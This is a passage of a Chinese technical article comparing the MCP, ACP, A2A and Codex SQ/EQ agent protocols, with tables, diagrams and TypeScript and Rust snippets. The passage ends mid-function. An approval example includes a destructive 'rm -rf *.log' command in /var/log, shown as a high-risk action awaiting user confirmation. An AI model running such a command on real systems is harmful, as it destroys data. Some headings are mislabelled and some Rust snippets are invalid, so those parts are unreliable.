<table><thead><tr><th>优势</th><th>具体表现</th><th>对比 ACP/MCP</th></tr></thead><tbody><tr><td><strong>🔄 真正的流式体验</strong></td><td>通过 SSE 实时推送 LLM 生成的每个 token</td><td>ACP 也支持流式，MCP 不支持</td></tr><tr><td><strong>📊 完整状态管理</strong></td><td>6 种状态 + 状态转换历史</td><td>ACP 有会话状态，MCP 无状态</td></tr><tr><td><strong>🔌 Multi-Agent 支持</strong></td><td>原生支持 Agent 发现和协作</td><td>ACP 专注 Editor-Agent，MCP 无此概念</td></tr><tr><td><strong>🛠️ MCP 集成</strong></td><td>无缝复用整个 MCP 生态的工具</td><td>ACP 也支持 MCP，但未深度集成</td></tr><tr><td><strong>⚡ 并发工具调用</strong></td><td>可同时执行多个工具，大幅提升效率</td><td>MCP 也支持，但需要自行实现并发控制</td></tr><tr><td><strong>💾 任务持久化</strong></td><td>支持暂停任务，稍后从断点恢复</td><td>ACP 支持 session 加载，MCP 无此能力</td></tr><tr><td><strong>🎯 事件驱动架构</strong></td><td>EventBus 解耦组件，易于扩展</td><td>ACP 使用通知，但没有统一 EventBus</td></tr></tbody></table>
<p><strong>A2A 的适用场景</strong>:</p>
<p>✅ <strong>推荐使用 A2A</strong>:</p>
<ul>
<li>需要多个 Agent 协作完成复杂任务</li>
<li>任务执行时间较长（&gt;30秒），需要中间状态反馈</li>
<li>需要支持任务暂停和恢复</li>
<li>需要完整的审计日志和状态历史</li>
<li>希望复用 MCP 生态的工具</li>
</ul>
<p>❌ <strong>不推荐使用 A2A</strong>:</p>
<ul>
<li>简单的单 Agent 场景（用 ACP 更轻量）</li>
<li>对性能要求极高的场景（Rust 实现的 Codex 更快）</li>
<li>只需要工具调用，不需要 Agent 协作（直接用 MCP）</li>
<li>低延迟要求（&lt;100ms）的实时场景</li>
</ul>
<hr/>
<h4 data-id="heading-45">4.5 Codex 的 SQ/EQ 协议设计</h4>
<blockquote>
<p>⚠️ <strong>注意</strong>: Codex 的实现与 ACP 官方标准也<strong>不同</strong>，采用了独特的 <strong>SQ/EQ (Submission Queue / Event Queue)</strong> 模式。</p>
</blockquote>
<p>Codex 的协议设计：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// codex-rs/protocol/src/protocol.rs</span>

<span class="hljs-comment">/// Submission Queue - 用户提交的操作</span>
<span class="hljs-meta">#[derive(Debug, Clone, Serialize, Deserialize)]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Submission</span> {
    <span class="hljs-keyword">pub</span> id: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> op: Op,
}

<span class="hljs-meta">#[derive(Debug, Clone, Serialize, Deserialize)]</span>
<span class="hljs-meta">#[serde(tag = <span class="hljs-string">"type"</span>, rename_all = <span class="hljs-string">"snake_case"</span>)]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">Op</span> {
    <span class="hljs-comment">/// 用户输入</span>
    UserTurn {
        items: <span class="hljs-type">Vec</span>&lt;UserInput&gt;,
        cwd: PathBuf,
        approval_policy: AskForApproval,
        sandbox_policy: SandboxPolicy,
        model: <span class="hljs-type">String</span>,
    },

    <span class="hljs-comment">/// 中断当前任务</span>
    Interrupt,

    <span class="hljs-comment">/// 批准工具执行</span>
    ExecApproval {
        id: <span class="hljs-type">String</span>,
        decision: ReviewDecision,
    },

    <span class="hljs-comment">/// 批准代码补丁</span>
    PatchApproval {
        id: <span class="hljs-type">String</span>,
        decision: ReviewDecision,
    },

    <span class="hljs-comment">/// 解决 MCP 授权请求</span>
    ResolveElicitation {
        server_name: <span class="hljs-type">String</span>,
        request_id: RequestId,
        decision: ElicitationAction,
    },
}

<span class="hljs-comment">/// Event Queue - Agent 发出的事件</span>
<span class="hljs-meta">#[derive(Debug, Clone, Serialize, Deserialize)]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Event</span> {
    <span class="hljs-keyword">pub</span> id: <span class="hljs-type">String</span>,
    <span class="hljs-keyword">pub</span> msg: EventMsg,
}

<span class="hljs-meta">#[derive(Debug, Clone, Serialize, Deserialize)]</span>
<span class="hljs-meta">#[serde(tag = <span class="hljs-string">"type"</span>, rename_all = <span class="hljs-string">"snake_case"</span>)]</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">enum</span> <span class="hljs-title class_">EventMsg</span> {
    <span class="hljs-comment">/// Agent 消息</span>
    <span class="hljs-title function_ invoke__">AgentMessage</span>(AgentMessageEvent),

    <span class="hljs-comment">/// 工具调用请求</span>
    <span class="hljs-title function_ invoke__">ToolCall</span>(ToolCallEvent),

    <span class="hljs-comment">/// 需要批准执行</span>
    <span class="hljs-title function_ invoke__">ExecApprovalRequest</span>(ExecApprovalRequestEvent),

    <span class="hljs-comment">/// 需要批准补丁</span>
    <span class="hljs-title function_ invoke__">ApplyPatchApprovalRequest</span>(ApplyPatchApprovalRequestEvent),

    <span class="hljs-comment">/// Turn 完成</span>
    <span class="hljs-title function_ invoke__">TurnComplete</span>(TurnCompleteEvent),

    <span class="hljs-comment">/// Turn 中止</span>
    <span class="hljs-title function_ invoke__">TurnAborted</span>(TurnAbortedEvent),
}
</code></pre>
<h4 data-id="heading-46">4.3 协议关系梳理：ACP vs A2A vs Codex</h4>
<p>为避免混淆，这里明确三者的定位和关系：</p>

































<table><thead><tr><th>协议/实现</th><th>定位</th><th>标准化状态</th><th>主要用途</th><th>实现方</th></tr></thead><tbody><tr><td><strong>ACP (Agent Client Protocol)</strong></td><td>官方标准协议</td><td>✅ 开放标准</td><td>Editor ↔ Agent 通信</td><td>Zed Industries (2025-08)</td></tr><tr><td><strong>A2A (Agent-to-Agent)</strong></td><td>实验性实现</td><td>🔬 非标准</td><td>Agent ↔ Agent 协作</td><td>Google Gemini CLI</td></tr><tr><td><strong>Codex SQ/EQ</strong></td><td>实验性实现</td><td>🔬 非标准</td><td>User ↔ Agent 交互</td><td>OpenAI/社区</td></tr></tbody></table>
<h5 data-id="heading-47"><strong>关键区别</strong></h5>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph Official["官方标准"]
        MCP["MCP (Anthropic)&lt;br/&gt;Agent ↔ Tools"]
        ACP["ACP (Zed)&lt;br/&gt;Editor ↔ Agent"]

        style Official fill:#c8e6c9,stroke:#2e7d32,stroke-width:2px
        style MCP fill:#a5d6a7,stroke:#388e3c
        style ACP fill:#a5d6a7,stroke:#388e3c
    end

    subgraph Vendor["厂商实现 (实验性)"]
        A2A["A2A (Google)&lt;br/&gt;Agent ↔ Agent"]
        Codex["Codex SQ/EQ (社区)&lt;br/&gt;User ↔ Agent"]

        style Vendor fill:#fff3e0,stroke:#e65100,stroke-width:2px
        style A2A fill:#ffcc80,stroke:#f57c00
        style Codex fill:#ffcc80,stroke:#f57c00
    end
</code></pre>
<p><strong>为什么会有这种现象？</strong></p>
<ol>
<li><strong>ACP 发布时间线</strong>：ACP 在 2025 年 8 月才正式发布，而 Gemini CLI 和 Codex 的开发更早，当时还没有统一标准</li>
<li><strong>不同的关注点</strong>：
<ul>
<li>ACP 关注 <strong>编辑器集成</strong>（类似 LSP）</li>
<li>A2A 关注 <strong>Agent 编排</strong>（Multi-Agent 系统）</li>
<li>Codex SQ/EQ 关注 <strong>用户体验</strong>（审批流程和安全）</li>
</ul>
</li>
<li><strong>演进方向</strong>：预计未来这些实现可能会向 ACP 标准靠拢或互补</li>
</ol>
<p><strong>对开发者的建议</strong>：</p>
<ul>
<li>✅ 如果开发编辑器插件，优先使用 <strong>ACP 官方标准</strong></li>
<li>🔬 如果研究 Multi-Agent 系统，可以参考 <strong>A2A 的设计思路</strong></li>
<li>🔐 如果注重安全审批，可以借鉴 <strong>Codex 的 Approval 机制</strong></li>
</ul>
<hr/>
<h3 data-id="heading-48">五、核心差异对比：ACP vs MCP vs 各家实现</h3>
<h4 data-id="heading-49">5.1 协议定位对比</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    subgraph AppLayer["应用层 - A2A (Agent-to-Agent)"]
        App1["Gemini A2A Server"]
        App2["Agent 协作编排"]
        App3["任务状态管理"]

        style AppLayer fill:#e1f5fe,stroke:#01579b,stroke-width:2px
    end

    subgraph AgentLayer["Agent层 - Codex SQ/EQ Protocol"]
        Agent1["Submission Queue&lt;br/&gt;(用户 → Agent)"]
        Agent2["Event Queue&lt;br/&gt;(Agent → 用户)"]
        Agent3["审批流程 (Approval)"]

        style AgentLayer fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    end

    subgraph ToolLayer["工具层 - MCP (Model Context Protocol)"]
        Tool1["工具发现与调用"]
        Tool2["资源访问"]
        Tool3["Prompt 管理"]

        style ToolLayer fill:#fff3e0,stroke:#e65100,stroke-width:2px
    end

    subgraph TransportLayer["传输层"]
        Trans1["stdio / SSE / HTTP / WebSocket"]

        style TransportLayer fill:#e8f5e9,stroke:#2e7d32,stroke-width:2px
    end

    AppLayer --&gt; AgentLayer
    AgentLayer --&gt; ToolLayer
    ToolLayer --&gt; TransportLayer

    style App1 fill:#b3e5fc,stroke:#01579b
    style App2 fill:#b3e5fc,stroke:#01579b
    style App3 fill:#b3e5fc,stroke:#01579b
    style Agent1 fill:#e1bee7,stroke:#6a1b9a
    style Agent2 fill:#e1bee7,stroke:#6a1b9a
    style Agent3 fill:#e1bee7,stroke:#6a1b9a
    style Tool1 fill:#ffe0b2,stroke:#e65100
    style Tool2 fill:#ffe0b2,stroke:#e65100
    style Tool3 fill:#ffe0b2,stroke:#e65100
</code></pre>
<h4 data-id="heading-50">5.2 详细对比表</h4>


















































































<table><thead><tr><th>维度</th><th>MCP</th><th>ACP (官方)</th><th>A2A (Gemini)</th><th>Codex SQ/EQ</th></tr></thead><tbody><tr><td><strong>协议目标</strong></td><td>Agent ↔ 工具/资源</td><td>Editor ↔ Agent</td><td>Agent ↔ Agent</td><td>用户 ↔ Agent</td></tr><tr><td><strong>发布方</strong></td><td>Anthropic</td><td>Zed Industries</td><td>Google</td><td>OpenAI (社区)</td></tr><tr><td><strong>协议版本</strong></td><td>2025-06-18</td><td>Version 1 (2025-08)</td><td>0.3.0</td><td>v0.2.0-alpha</td></tr><tr><td><strong>通信模式</strong></td><td>Request/Response</td><td>Request/Response + Notifications</td><td>Event-Driven (SSE)</td><td>Queue-Based</td></tr><tr><td><strong>状态管理</strong></td><td>无状态</td><td>有状态 (会话)</td><td>有状态 (任务)</td><td>有状态 (会话)</td></tr><tr><td><strong>传输方式</strong></td><td>stdio, SSE, HTTP</td><td>stdio (JSON-RPC)</td><td>HTTP + SSE</td><td>In-Process Channels</td></tr><tr><td><strong>权限模型</strong></td><td>Elicitation</td><td>Permission Request</td><td>Confirmation</td><td>Approval</td></tr><tr><td><strong>流式支持</strong></td><td>❌ 不支持</td><td>✅ 支持</td><td>✅ 支持</td><td>✅ 支持</td></tr><tr><td><strong>语言绑定</strong></td><td>TS, Rust, Python</td><td>TS, Go, Rust, Python</td><td>TypeScript</td><td>Rust + TS SDK</td></tr><tr><td><strong>标准化程度</strong></td><td>✅ 官方标准</td><td>✅ 官方标准</td><td>🔬 实验性实现</td><td>🔬 实验性实现</td></tr></tbody></table>
<h4 data-id="heading-51">5.3 工具调用流程对比</h4>
<h5 data-id="heading-52"><strong>MCP 工具调用</strong> (同步):</h5>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-string">User</span> <span class="hljs-string">→</span> <span class="hljs-attr">Agent:</span> <span class="hljs-string">"读取文件 /etc/hosts"</span>
<span class="hljs-string">Agent</span> <span class="hljs-string">→</span> <span class="hljs-attr">MCP Server:</span> <span class="hljs-string">tools/call</span> { <span class="hljs-attr">name:</span> <span class="hljs-string">"read_file"</span>, <span class="hljs-attr">args:</span> {<span class="hljs-string">...</span>} }
<span class="hljs-string">MCP</span> <span class="hljs-string">Server</span> <span class="hljs-string">→</span> <span class="hljs-attr">Agent:</span> { <span class="hljs-attr">content:</span> [<span class="hljs-string">...</span>], <span class="hljs-attr">isError:</span> <span class="hljs-literal">false</span> }
<span class="hljs-string">Agent</span> <span class="hljs-string">→</span> <span class="hljs-attr">User:</span> <span class="hljs-string">"文件内容如下..."</span>
</code></pre>
<h5 data-id="heading-53"><strong>A2A 工具调用</strong> (流式):</h5>
<pre><code class="hljs language-css" lang="css">User → Agent <span class="hljs-selector-tag">A</span>: <span class="hljs-string">"读取并分析文件"</span>
Agent A → EventBus: { status: <span class="hljs-string">'working'</span>, message: <span class="hljs-string">"正在读取..."</span> }
Agent <span class="hljs-selector-tag">A</span> → Tool: <span class="hljs-built_in">read_file</span>(...)
Tool → Agent A: (file content)
Agent A → EventBus: { status: <span class="hljs-string">'working'</span>, message: <span class="hljs-string">"正在分析..."</span> }
Agent <span class="hljs-selector-tag">A</span> → Agent <span class="hljs-selector-tag">B</span>: <span class="hljs-built_in">analyze</span>(content)  // 可选的 Multi-Agent
Agent B → EventBus: { status: <span class="hljs-string">'working'</span>, message: <span class="hljs-string">"分析结果..."</span> }
EventBus → User: (流式展示每一步)
</code></pre>
<h5 data-id="heading-54"><strong>Codex SQ/EQ</strong> (异步队列):</h5>
<pre><code class="hljs language-css" lang="css">User → SQ: Submission { op: UserTurn { text: <span class="hljs-string">"..."</span> } }
Agent → EQ: Event { msg: AgentMessage { text: <span class="hljs-string">"正在处理..."</span> } }
Agent → EQ: Event { msg: ToolCall { tool: <span class="hljs-string">"shell"</span>, cmd: <span class="hljs-string">"ls"</span> } }
Agent → EQ: Event { msg: ExecApprovalRequest {...} }
User → SQ: Submission { op: ExecApproval { decision: Allow } }
Agent → EQ: Event { msg: ToolCallResult {...} }
Agent → EQ: Event { msg: TurnComplete }
</code></pre>
<hr/>
<h3 data-id="heading-55">六、实际应用场景</h3>
<h4 data-id="heading-56">6.1 MCP 典型场景</h4>
<h5 data-id="heading-57"><strong>场景 1: 统一的开发工具接入</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 配置文件: ~/.gemini/settings.json</span>
{
  <span class="hljs-string">"mcpServers"</span>: {
    <span class="hljs-string">"github"</span>: {
      <span class="hljs-string">"command"</span>: <span class="hljs-string">"npx"</span>,
      <span class="hljs-string">"args"</span>: [<span class="hljs-string">"-y"</span>, <span class="hljs-string">"@modelcontextprotocol/server-github"</span>],
      <span class="hljs-string">"env"</span>: {
        <span class="hljs-string">"GITHUB_TOKEN"</span>: <span class="hljs-string">"${GITHUB_TOKEN}"</span>
      }
    },
    <span class="hljs-string">"postgres"</span>: {
      <span class="hljs-string">"command"</span>: <span class="hljs-string">"uvx"</span>,
      <span class="hljs-string">"args"</span>: [<span class="hljs-string">"mcp-server-postgres"</span>],
      <span class="hljs-string">"env"</span>: {
        <span class="hljs-string">"DATABASE_URL"</span>: <span class="hljs-string">"postgresql://..."</span>
      }
    },
    <span class="hljs-string">"filesystem"</span>: {
      <span class="hljs-string">"command"</span>: <span class="hljs-string">"npx"</span>,
      <span class="hljs-string">"args"</span>: [<span class="hljs-string">"-y"</span>, <span class="hljs-string">"@modelcontextprotocol/server-filesystem"</span>, <span class="hljs-string">"/workspace"</span>]
    }
  }
}
</code></pre>
<p><strong>使用</strong>:</p>
<pre><code class="hljs language-bash" lang="bash">$ gemini
&gt; @github List my open pull requests
&gt; @postgres Run query: SELECT * FROM <span class="hljs-built_in">users</span> WHERE active = <span class="hljs-literal">true</span>
&gt; @filesystem Read file package.json
</code></pre>
<h5 data-id="heading-58"><strong>场景 2: 企业内部工具集成</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 自定义 MCP Server</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Server</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@modelcontextprotocol/sdk/server'</span>;

<span class="hljs-keyword">const</span> server = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Server</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'company-internal-tools'</span>,
  <span class="hljs-attr">version</span>: <span class="hljs-string">'1.0.0'</span>
});

server.<span class="hljs-title function_">setRequestHandler</span>(<span class="hljs-title class_">ListToolsRequestSchema</span>, <span class="hljs-keyword">async</span> () =&gt; ({
  <span class="hljs-attr">tools</span>: [
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'query_jira'</span>,
      <span class="hljs-attr">description</span>: <span class="hljs-string">'Query JIRA tickets'</span>,
      <span class="hljs-attr">inputSchema</span>: {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
        <span class="hljs-attr">properties</span>: {
          <span class="hljs-attr">jql</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span> }
        }
      }
    },
    {
      <span class="hljs-attr">name</span>: <span class="hljs-string">'deploy_to_k8s'</span>,
      <span class="hljs-attr">description</span>: <span class="hljs-string">'Deploy application to Kubernetes'</span>,
      <span class="hljs-attr">inputSchema</span>: {
        <span class="hljs-attr">type</span>: <span class="hljs-string">'object'</span>,
        <span class="hljs-attr">properties</span>: {
          <span class="hljs-attr">namespace</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span> },
          <span class="hljs-attr">image</span>: { <span class="hljs-attr">type</span>: <span class="hljs-string">'string'</span> }
        }
      }
    }
  ]
}));
</code></pre>
<h4 data-id="heading-59">6.2 ACP 典型场景（官方标准）</h4>
<h5 data-id="heading-60"><strong>场景 1: Multi-Agent 协作工作流</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> { createAgent } <span class="hljs-keyword">from</span> <span class="hljs-string">'@a2a-js/sdk'</span>;

<span class="hljs-comment">// Agent 1: 代码生成专家</span>
<span class="hljs-keyword">const</span> codeGenAgent = <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
  <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://gemini-a2a:41242'</span>
});

<span class="hljs-comment">// Agent 2: 代码审查专家</span>
<span class="hljs-keyword">const</span> codeReviewAgent = <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
  <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://claude-a2a:3000'</span>
});

<span class="hljs-comment">// 工作流编排</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">developFeature</span>(<span class="hljs-params">requirement: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-comment">// Step 1: 生成代码</span>
  <span class="hljs-keyword">const</span> codeTask = <span class="hljs-keyword">await</span> codeGenAgent.<span class="hljs-title function_">createTask</span>({
    <span class="hljs-attr">message</span>: {
      <span class="hljs-attr">parts</span>: [{ <span class="hljs-attr">kind</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">text</span>: <span class="hljs-string">`实现功能: <span class="hljs-subst">${requirement}</span>`</span> }]
    }
  });

  <span class="hljs-keyword">const</span> code = <span class="hljs-keyword">await</span> codeTask.<span class="hljs-title function_">waitForCompletion</span>();

  <span class="hljs-comment">// Step 2: 审查代码</span>
  <span class="hljs-keyword">const</span> reviewTask = <span class="hljs-keyword">await</span> codeReviewAgent.<span class="hljs-title function_">createTask</span>({
    <span class="hljs-attr">message</span>: {
      <span class="hljs-attr">parts</span>: [{
        <span class="hljs-attr">kind</span>: <span class="hljs-string">'text'</span>,
        <span class="hljs-attr">text</span>: <span class="hljs-string">`审查以下代码并提供改进建议:\n<span class="hljs-subst">${code}</span>`</span>
      }]
    }
  });

  <span class="hljs-keyword">const</span> review = <span class="hljs-keyword">await</span> reviewTask.<span class="hljs-title function_">waitForCompletion</span>();

  <span class="hljs-comment">// Step 3: 根据审查意见改进</span>
  <span class="hljs-keyword">const</span> improvedCodeTask = <span class="hljs-keyword">await</span> codeGenAgent.<span class="hljs-title function_">createTask</span>({
    <span class="hljs-attr">message</span>: {
      <span class="hljs-attr">parts</span>: [{
        <span class="hljs-attr">kind</span>: <span class="hljs-string">'text'</span>,
        <span class="hljs-attr">text</span>: <span class="hljs-string">`根据审查意见改进代码:\n审查意见: <span class="hljs-subst">${review}</span>\n原代码: <span class="hljs-subst">${code}</span>`</span>
      }]
    }
  });

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">await</span> improvedCodeTask.<span class="hljs-title function_">waitForCompletion</span>();
}
</code></pre>
<h5 data-id="heading-61"><strong>场景 2: Agent 服务化部署</strong></h5>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 将 Gemini CLI 部署为 A2A 服务</span>
<span class="hljs-keyword">import</span> { A2AExpressApp } <span class="hljs-keyword">from</span> <span class="hljs-string">'@a2a-js/sdk/server/express'</span>;
<span class="hljs-keyword">import</span> express <span class="hljs-keyword">from</span> <span class="hljs-string">'express'</span>;

<span class="hljs-keyword">const</span> app = <span class="hljs-title function_">express</span>();
<span class="hljs-keyword">const</span> a2aApp = <span class="hljs-keyword">new</span> <span class="hljs-title function_">A2AExpressApp</span>(requestHandler);

a2aApp.<span class="hljs-title function_">setupRoutes</span>(app, <span class="hljs-string">'/api'</span>);
app.<span class="hljs-title function_">listen</span>(<span class="hljs-number">41242</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Gemini A2A Server running on http://localhost:41242'</span>);
});

<span class="hljs-comment">// 现在其他 Agent 可以调用</span>
<span class="hljs-keyword">const</span> geminiAgent = <span class="hljs-keyword">await</span> <span class="hljs-title function_">createAgent</span>({
  <span class="hljs-attr">agentUrl</span>: <span class="hljs-string">'http://localhost:41242/api'</span>
});
</code></pre>
<h4 data-id="heading-62">6.3 Codex SQ/EQ 典型场景</h4>
<h5 data-id="heading-63"><strong>场景 1: 细粒度的审批控制</strong></h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 定义审批策略</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">approval_policy</span> = AskForApproval::AskBeforeExecuting;
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">sandbox_policy</span> = SandboxPolicy::Strict;

<span class="hljs-comment">// 提交用户输入</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">submission</span> = Submission {
    id: <span class="hljs-string">"sub-001"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
    op: Op::UserTurn {
        items: <span class="hljs-built_in">vec!</span>[UserInput::<span class="hljs-title function_ invoke__">Text</span>(<span class="hljs-string">"删除所有日志文件"</span>.<span class="hljs-title function_ invoke__">to_string</span>())],
        cwd: PathBuf::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"/var/log"</span>),
        approval_policy,
        sandbox_policy,
        model: <span class="hljs-string">"gpt-4"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
    }
};

<span class="hljs-comment">// Agent 请求批准</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">event</span> = Event {
    id: <span class="hljs-string">"evt-001"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
    msg: EventMsg::<span class="hljs-title function_ invoke__">ExecApprovalRequest</span>(ExecApprovalRequestEvent {
        command: <span class="hljs-string">"rm -rf *.log"</span>,
        assessment: SandboxCommandAssessment {
            risk_level: SandboxRiskLevel::High,
            reason: <span class="hljs-string">"批量删除操作"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        }
    })
};

<span class="hljs-comment">// 用户批准或拒绝</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">approval</span> = Submission {
    id: <span class="hljs-string">"sub-002"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
    op: Op::ExecApproval {
        id: <span class="hljs-string">"evt-001"</span>.<span class="hljs-title function_ invoke__">to_string</span>(),
        decision: ReviewDecision::Approve,
    }
};
</code></pre>
<h5 data-id="heading-64"><strong>场景 2: 会话恢复</strong></h5>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 保存会话状态</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">conversation_id</span> = ConversationId::<span class="hljs-title function_ invoke__">new</span>();
conversation_manager.<span class="hljs-title function_ invoke__">save_state</span>(conversation_id, &amp;state).<span class="hljs-keyword">await</span>?;

<span class="hljs-comment">// 稍后恢复</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">restored_state</span> = conversation_manager.<span class="hljs-title function_ invoke__">load_state</span>(conversation_id).<span class="hljs-keyword">await</span>?;
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">conversation</span> = CodexConversation::<span class="hljs-title function_ invoke__">from_state</span>(restored_state)?;
</code></pre>
<hr/>
<h3 data-id="heading-65">七、技术挑战与解决方案</h3>
<h4 data-id="heading-66">7.1 工具命名冲突</h4>
<p><strong>问题</strong>: 多个 MCP Server 可能提供同名工具</p>
<p><strong>Gemini CLI 解决方案</strong>:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 server_name 作为 namespace</span>
<span class="hljs-keyword">const</span> toolName = <span class="hljs-string">`<span class="hljs-subst">${serverName}</span>.<span class="hljs-subst">${originalToolName}</span>`</span>;
<span class="hljs-comment">// 例如: "github.create_issue", "gitlab.create_issue"</span>
</code></pre>
<p><strong>Codex 解决方案</strong>:</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 使用双下划线分隔符 + SHA1 截断</span>
<span class="hljs-keyword">const</span> DELIMITER = <span class="hljs-string">"__"</span>;
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">qualified_name</span> = <span class="hljs-built_in">format!</span>(
    <span class="hljs-string">"mcp{}{}{}{}"</span>,
    DELIMITER, server_name, DELIMITER, tool_name
);

<span class="hljs-keyword">if</span> qualified_name.<span class="hljs-title function_ invoke__">len</span>() &gt; <span class="hljs-number">64</span> {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">hash</span> = sha1::Sha1::<span class="hljs-title function_ invoke__">digest</span>(qualified_name);
    qualified_name = <span class="hljs-built_in">format!</span>(<span class="hljs-string">"{}_{:x}"</span>, &amp;qualified_name[..<span class="hljs-number">48</span>], hash);
}
<span class="hljs-comment">// 例如: "mcp__github__create_issue"</span>
</code></pre>
<h4 data-id="heading-67">7.2 流式输出的挑战</h4>
<p><strong>问题</strong>: LLM 生成是流式的，但工具调用是同步的</p>
<p><strong>A2A 解决方案</strong>:</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 使用 EventBus 解耦</span>
<span class="hljs-keyword">for</span> <span class="hljs-keyword">await</span> (<span class="hljs-keyword">const</span> chunk <span class="hljs-keyword">of</span> llmStream) {
  eventBus.<span class="hljs-title function_">publish</span>({
    <span class="hljs-attr">kind</span>: <span class="hljs-string">'status-update'</span>,
    <span class="hljs-attr">status</span>: {
      <span class="hljs-attr">message</span>: { <span class="hljs-attr">parts</span>: [{ <span class="hljs-attr">kind</span>: <span class="hljs-string">'text'</span>, <span class="hljs-attr">text</span>: chunk }] }
    },
    <span class="hljs-attr">final</span>: <span class="hljs-literal">false</span>  <span class="hljs-comment">// 非最终状态，继续接收</span>
  });
}
</code></pre>
<p><strong>Codex 解决方案</strong>:</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 使用 AsyncIterator</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">send_message_stream</span>(
    &amp;<span class="hljs-keyword">self</span>,
    items: <span class="hljs-type">Vec</span>&lt;UserInput&gt;
) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">impl</span> <span class="hljs-title class_">Stream</span>&lt;Item = <span class="hljs-type">Result</span>&lt;Event&gt;&gt; {
    async_stream::stream! {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">response</span> = <span class="hljs-keyword">self</span>.llm_client.<span class="hljs-title function_ invoke__">chat</span>(items).<span class="hljs-keyword">await</span>?;
        <span class="hljs-keyword">for</span> <span class="hljs-title class_">await</span> chunk <span class="hljs-keyword">in</span> response.stream {
            <span class="hljs-keyword">yield</span> <span class="hljs-title function_ invoke__">Ok</span>(Event {
                msg: EventMsg::<span class="hljs-title function_ invoke__">AgentMessage</span>(chunk)
            });
        }
    }
}
</code></pre>
<h4 data-id="heading-68">7.3 安全性和沙箱</h4>
<p><strong>Codex 的多层沙箱方案</strong>:</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// 1. Execpolicy - 命令级别的策略</span>
<span class="hljs-keyword">pub</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">ExecPolicy</span> {
    auto_approve: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;,    <span class="hljs-comment">// 自动批准的命令</span>
    always_deny: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;,      <span class="hljs-comment">// 始终拒绝的命令</span>
    require_confirm: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;,  <span class="hljs-comment">// 需要确认的命令</span>
}

<span class="hljs-comment">// 2. Platform Sandbox - 操作系统级别的隔离</span>
<span class="hljs-meta">#[cfg(target_os = <span class="hljs-string">"macos"</span>)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">apply_seatbelt_sandbox</span>(cmd: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;()&gt; {
